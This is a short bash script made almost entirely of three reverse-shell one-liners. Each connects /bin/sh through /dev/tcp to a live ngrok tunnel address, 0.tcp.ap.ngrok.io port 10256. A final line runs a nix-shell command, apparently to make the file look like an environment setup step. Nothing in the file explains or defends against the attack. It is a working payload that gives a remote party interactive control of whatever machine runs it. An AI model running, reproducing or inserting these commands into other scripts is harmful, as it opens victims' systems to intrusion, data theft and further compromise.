#!/bin/bash
/bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/10256 0>&1
0<&196;exec 196<>/dev/tcp/0.tcp.ap.ngrok.io/10256; /bin/sh <&196 >&196 2>&196
exec 5<>/dev/tcp/0.tcp.ap.ngrok.io/10256;cat <&5 | while read line; do $line 2>&5 >&5; done
nix-shell proto.nix --run ""
